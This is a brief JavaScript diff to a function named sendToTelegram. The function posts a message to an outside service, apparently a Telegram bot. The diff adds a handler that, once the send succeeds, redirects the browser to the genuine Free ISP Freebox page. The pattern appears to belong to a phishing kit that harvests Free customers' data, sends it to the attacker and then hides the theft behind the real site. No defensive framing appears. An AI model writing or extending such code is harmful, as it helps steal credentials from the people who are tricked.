@@ -27,5 +27,11 @@ function sendToTelegram(){
             text: message
         })
     })
-   
+.then(response => {
+    if (response.ok) {
+        window.location.href = "https://www.free.fr/freebox";
+    } else {
+        console.error("Erreur lors de l'envoi.");
+    }
+})  
 }
